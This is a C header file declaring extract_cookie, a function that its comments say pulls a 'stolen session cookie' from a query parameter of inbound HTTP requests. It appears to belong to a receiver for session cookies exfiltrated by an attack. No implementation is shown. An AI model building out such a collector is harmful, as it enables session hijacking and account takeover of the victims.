/*
 * cookie.h
 *
 * Extraction of the stolen session cookie from an inbound HTTP request.
 */

#ifndef COOKIE_H
#define COOKIE_H

#include <stddef.h>

/*
 * Scan an inbound HTTP request for the cookie carried in the COOKIE_PARAM query
 * parameter and copy its value into dest (always NUL-terminated, never more
 * than max_len bytes). dest is set to the empty string if no cookie is found.
 */
void extract_cookie(const char *request, char *dest, size_t max_len);

#endif /* COOKIE_H */
